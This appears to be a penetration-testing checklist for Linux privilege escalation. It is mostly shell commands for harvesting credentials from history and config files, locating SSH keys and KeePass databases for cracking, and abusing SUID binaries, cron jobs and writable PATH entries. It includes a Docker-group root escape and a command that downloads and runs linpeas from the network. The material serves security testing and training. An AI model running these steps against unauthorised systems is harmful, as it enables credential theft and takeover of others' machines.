# Linux Privesc Checklist

> Run-through-in-order. Stop when you find something that escalates.

## Phase 1 — current user (60 seconds)

```bash
id
hostname
uname -a
cat /etc/os-release
sudo -l                 # ← single highest-leverage check
groups
```

- [ ] `sudo -l` checked? GTFOBins for any allowed binary.
- [ ] `groups` includes `docker`, `lxd`, `disk`, `sudo`, `wheel`, `adm`?

## Phase 2 — historical commands

```bash
cat ~/.bash_history
cat ~/.zsh_history
cat ~/.mysql_history
cat ~/.psql_history
cat ~/.lesshst
cat ~/.viminfo
ls -la ~/.gnupg/
```

- [ ] Searched every history file for `pass`, `sudo`, `ssh`?

## Phase 3 — SUID / SGID / capabilities

```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
getcap -r / 2>/dev/null
```

- [ ] Each SUID binary checked against GTFOBins?
- [ ] Each capability decoded? `cap_setuid+ep`, `cap_dac_read_search+ep`, etc.?
- [ ] Custom SUIDs (in `/opt`, `/usr/local/bin`) inspected with strings/ltrace?

## Phase 4 — scheduled tasks

```bash
ls -la /etc/cron.{d,daily,hourly,weekly,monthly}
cat /etc/crontab
ls -la /var/spool/cron/crontabs/ 2>/dev/null
systemctl list-timers --all
```

```bash
# pspy for 60-300s
./pspy64 -pf -i 1000 | tee pspy.log
grep 'UID=0' pspy.log
```

- [ ] All scripts referenced from cron checked for write permission?
- [ ] All directories containing those scripts checked for write permission?
- [ ] All systemd unit files checked for `ExecStart` writability?

## Phase 5 — file mining

```bash
# config files
find / -iname "*.conf" 2>/dev/null | grep -vE "^/(usr|var|proc|sys)" | head -50
find / -iname "*.config" 2>/dev/null
find / -iname "*.ini" 2>/dev/null

# backups
find / -iname "*.bak" -o -iname "*.old" -o -iname "*.swp" 2>/dev/null
find / -iname "*.kdbx" -o -iname "*.kdb" 2>/dev/null

# credentials regex sweep
sudo grep -RinE "(pass|pwd|secret|key|token|connection)\s*[:=]" \
  /etc /opt /home /var/www /root 2>/dev/null
```

- [ ] App config files in `/etc`, `/opt`, `/var/www` parsed for creds?
- [ ] All KeePass `.kdbx` databases extracted for cracking?
- [ ] All non-root user homes inspected (when readable)?

## Phase 6 — SSH

```bash
ls -la /home/*/.ssh/ 2>/dev/null
ls -la /root/.ssh/ 2>/dev/null
find / -name "id_rsa*" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null
```

- [ ] All discovered SSH keys tried against every known user?
- [ ] Key passphrases cracked via `ssh2john` + `john`?

## Phase 7 — services / sockets

```bash
ss -tlnp; ss -ulnp
netstat -tlnp 2>/dev/null
ps -ef | grep -v "\[" | sort -u
```

- [ ] Listening on `127.0.0.1` services identified?
- [ ] Process list contains uncommon binaries?
- [ ] Ports tunneled back for fuzzing?

## Phase 8 — writable / world-writable

```bash
# writable dirs in PATH
echo $PATH | tr ':' '\n' | xargs -I{} ls -la {} 2>/dev/null | grep "^d.*w.*"

# world-writable files / dirs (avoid /tmp, /proc, /sys)
find / -path /proc -prune -o -type f \( -perm -o+w -o -perm -g+w \) -print 2>/dev/null \
  | grep -vE "^/(sys|proc|run|dev|tmp)"
find / -path /proc -prune -o -type d \( -perm -o+w \) -print 2>/dev/null \
  | grep -vE "^/(sys|proc|run|dev|tmp)"
```

- [ ] Writable PATH dir → drop a malicious binary?
- [ ] Writable script invoked elsewhere?

## Phase 9 — kernel / sudo / docker / lxd

```bash
# kernel
uname -a
cat /etc/os-release
# linux-exploit-suggester
./linux-exploit-suggester.sh

# sudo CVEs
sudo -V

# docker / lxd group privesc?
id | grep -E "docker|lxd"
```

- [ ] Linux exploit suggester run? Match candidates to actual kernel?
- [ ] sudo version compared to known CVEs (1.8.27 / 1.9.5p2)?
- [ ] Docker group → `docker run -v /:/mnt --rm -it alpine chroot /mnt`?
- [ ] LXD group → image trick documented in HackTricks?

## Phase 10 — NFS / mount

```bash
mount
showmount -e <ip>             # if applicable
cat /etc/exports
cat /etc/fstab
```

- [ ] NFS export with `no_root_squash`?
- [ ] Mounted volume readable that shouldn't be?

## Phase 11 — automated

```bash
curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
./LinEnum.sh -t
./linux-smart-enumeration.sh -l 1
```

- [ ] linpeas read end-to-end (red `[+]` markers)?
- [ ] Findings cross-referenced with manual checks?

## Universal pivots if stuck

- Re-enumerate as another user (any pivot, even briefly).
- Reboot enumeration after a system "tick" (cron may have run).
- Look at *what the box does* — its purpose hints at the privesc.
- Try every captured credential against every user / service.

## Related

- [`linux-privesc/sudo-gtfobins.md`](../linux-privesc/sudo-gtfobins.md)
- [`linux-privesc/cron-writable-script.md`](../linux-privesc/cron-writable-script.md)
- [`linux-privesc/credential-reuse.md`](../linux-privesc/credential-reuse.md)
- [`methodology/06-linux-attack-flow.md`](../methodology/06-linux-attack-flow.md)
- [`methodology/08-privilege-escalation-heuristics.md`](../methodology/08-privilege-escalation-heuristics.md)
